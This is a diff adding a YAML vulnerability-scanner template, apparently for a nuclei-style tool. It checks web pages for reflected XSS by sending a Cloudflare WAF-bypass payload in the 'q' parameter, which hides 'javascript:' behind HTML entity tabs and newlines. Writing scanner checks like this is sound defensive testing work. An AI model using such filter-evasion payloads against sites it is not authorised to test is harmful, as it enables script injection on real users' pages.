@@ -1,0 +1,20 @@
+id: patt-xss-cf-06-q
+name: 'PATT xss patt-xss-cf-06 via q'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafcloudflare
+description: 'PATT Cloudflare 27 Feb 2018: entity Tab/NewLine inside scheme. [patt:patt-xss-cf-06] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      q:
+        - '<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;nxp0029&rpar;">X</a>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0029'
